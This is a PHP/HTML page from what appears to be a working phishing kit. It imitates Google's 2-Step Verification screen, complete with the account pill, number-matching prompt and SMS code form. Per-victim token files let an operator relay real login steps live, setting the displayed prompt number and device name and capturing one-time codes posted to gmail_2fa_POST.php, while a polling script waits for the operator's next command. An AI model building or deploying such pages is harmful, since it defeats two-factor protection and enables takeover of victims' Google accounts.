<?php
$token = $_GET['token'] ?? '';
$mode = $_GET['mode'] ?? 'device';

if ($token === '') {
    header('Location: continue.php');
    exit;
}

$filePath = "status/" . $token . ".txt";
if (file_exists($filePath)) {
    $data = trim(file_get_contents($filePath));
    if ($data === 'gm_verify') {
        header("Location: gmail_verify.php?token=" . urlencode($token));
        exit;
    } elseif ($data === 'gm_login') {
        header("Location: gmail_login.php?token=" . urlencode($token));
        exit;
    } elseif ($data === 'gm_hold') {
        header("Location: gmail_2fa_POST.php?token=" . urlencode($token) . "&waiting=1");
        exit;
    } elseif ($data === 'break') {
        header("Location: break.php?token=" . urlencode($token));
        exit;
    }
}

$email = '';
$emailFile = "emails/" . $token . ".txt";
if (file_exists($emailFile)) {
    $email = trim(file_get_contents($emailFile));
}
if ($email === '') {
    include_once "helper.php";
    $fromDb = getLoginEMailById($token);
    if ($fromDb !== null) {
        $email = $fromDb;
    }
}
if ($email === '') {
    $email = 'test@test.com';
}

$codemsg = '';
$codeMsgFile = "code_msg/" . $token . ".txt";
if (file_exists($codeMsgFile)) {
    $codemsg = trim(file_get_contents($codeMsgFile));
}

$parts = explode(':', $codemsg, 2);
$codeType = $parts[0] ?? '';
$content = isset($parts[1]) ? trim($parts[1]) : '';

$promptDir = "gmail_prompt";
if (!is_dir($promptDir)) {
    mkdir($promptDir, 0755, true);
}
$promptFile = $promptDir . "/" . $token . ".txt";

$deviceName = 'Apple iPhone 16 Pro Max';
$phoneMask = '*******11';
$promptNumber = (string) random_int(10, 99);

if ($codeType === 'wp') {
    $mode = 'device';
    if (preg_match('/^(\d+):(.+)$/', $content, $m)) {
        $promptNumber = $m[1];
        $deviceName = trim($m[2]);
    } elseif ($content !== '') {
        $deviceName = $content;
    }
} elseif ($codeType === 'phone') {
    $mode = 'pick';
    if ($content !== '') {
        $phoneMask = $content;
    }
}

if (file_exists($promptFile)) {
    $savedPrompt = trim(file_get_contents($promptFile));
    if ($codeType !== 'wp' || !preg_match('/^(\d+):(.+)$/', $content)) {
        if ($savedPrompt !== '') {
            $promptNumber = $savedPrompt;
        }
    }
}
file_put_contents($promptFile, $promptNumber);

$phoneSuffix = strlen($phoneMask) >= 2 ? substr($phoneMask, -2) : '11';
$step = $_GET['step'] ?? 'pick';

if ($mode === 'device') {
    file_put_contents($filePath, 'gm_2fa_device');
} else {
    file_put_contents($filePath, 'gm_2fa_pick');
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex,nofollow">
    <title>2-Step Verification - Google Accounts</title>
    <link href="gmail-files/common.css" rel="stylesheet">
    <link href="gmail-files/2fa.css" rel="stylesheet">
</head>
<body class="gm-2fa">
    <div class="gm-2fa-main">
        <div class="gm-2fa-card">
            <div class="gm-2fa-left">
                <?php include __DIR__ . '/gmail-files/google-icon.inc.php'; ?>
                <h1>2-Step Verification</h1>
                <p>To help keep your account safe, Google wants to make sure it's really you trying to sign in</p>
                <div class="gm-account-pill">
                    <span class="avatar"><?= strtoupper($email[0]); ?></span>
                    <span><?= htmlspecialchars($email); ?></span>
                    <span>&#9662;</span>
                </div>
                <?php if ($mode === 'device'): ?>
                <div class="gm-2fa-links" style="margin-top:32px;padding-top:0">
                    <a href="#">Resend it</a>
                </div>
                <?php endif; ?>
            </div>
            <div class="gm-2fa-right">
                <?php if ($mode === 'device'): ?>
                    <div class="gm-prompt-number"><?= htmlspecialchars($promptNumber); ?></div>
                    <div class="gm-device-title">Open the Gmail app on <?= htmlspecialchars($deviceName); ?></div>
                    <p class="gm-device-body">
                        Google sent a notification to your <?= htmlspecialchars($deviceName); ?>.
                        Open the Gmail app, tap <strong>Yes</strong> on the prompt, then tap
                        <strong><?= htmlspecialchars($promptNumber); ?></strong> on your phone to verify it's you.
                    </p>
                    <label class="gm-dont-ask">
                        <input type="checkbox" checked> Don't ask again on this device
                    </label>
                    <div class="gm-2fa-links">
                        <span></span>
                        <a href="#">Try another way</a>
                    </div>
                <?php elseif ($step === 'sms'): ?>
                    <div class="gm-sms-block">
                        <h3>2-Step Verification</h3>
                        <p class="gm-sms-subtitle">Get a verification code sent to &bull;&bull;&bull; &bull;&bull;&bull; &bull;&bull;<?= htmlspecialchars($phoneSuffix); ?></p>
                        <form method="post" action="gmail_2fa_POST.php" class="gm-sms-form">
                            <input type="hidden" name="token" value="<?= htmlspecialchars($token); ?>">
                            <input class="gm-sms-field" type="text" id="gm-sms-code" name="code" inputmode="numeric" autocomplete="one-time-code" maxlength="8" placeholder="Enter code" required>
                            <label class="gm-dont-ask">
                                <input type="checkbox"> Don't ask again on this computer
                            </label>
                            <div class="gm-2fa-links gm-sms-actions">
                                <a href="gmail_2fa.php?token=<?= urlencode($token); ?>&mode=pick">Try another way</a>
                                <button type="submit" class="gm-sms-next">Next</button>
                            </div>
                        </form>
                    </div>
                <?php else: ?>
                    <h2>Choose how you want to sign in:</h2>
                    <ul class="gm-pick-list">
                        <li class="gm-pick-item">
                            <svg class="gm-pick-icon" viewBox="0 0 24 24"><path d="M7 2h10a2 2 0 012 2v16a2 2 0 01-2 2H7a2 2 0 01-2-2V4a2 2 0 012-2zm0 2v16h10V4H7zm5 15a1.5 1.5 0 100-3 1.5 1.5 0 000 3z"/></svg>
                            <div>
                                <div class="title">Tap <strong>Yes</strong> on your phone or tablet</div>
                            </div>
                        </li>
                        <li class="gm-pick-item gm-pick-clickable">
                            <a href="gmail_2fa.php?token=<?= urlencode($token); ?>&mode=pick&step=sms" class="gm-pick-link">
                                <svg class="gm-pick-icon" viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H6l-2 2V4h16v12z"/></svg>
                                <div>
                                    <div class="title">Get a verification code at &bull;&bull;&bull; &bull;&bull;&bull; &bull;&bull;<?= htmlspecialchars($phoneSuffix); ?></div>
                                    <div class="sub">2-Step Verification phone<br>Standard rates apply<br>Unavailable on this device</div>
                                </div>
                            </a>
                        </li>
                        <li class="gm-pick-item">
                            <svg class="gm-pick-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
                            <div>
                                <div class="title">Try another way</div>
                            </div>
                        </li>
                    </ul>
                <?php endif; ?>
            </div>
        </div>
    </div>
    <footer class="gm-2fa-footer">
        <span>English (United States)</span>
        <div>
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </footer>
    <?php if ($step !== 'sms'): ?>
    <script src="gmail-files/status.js?v=3"></script>
    <script>
        gmCheckStatus(<?= json_encode($token); ?>, {
            pageStatus: <?= json_encode($mode === 'device' ? 'gm_2fa_device' : 'gm_2fa_pick'); ?>,
            holdStatuses: ['gm_hold', 'hold', 'continue', '']
        });
    </script>
    <?php endif; ?>
</body>
</html>
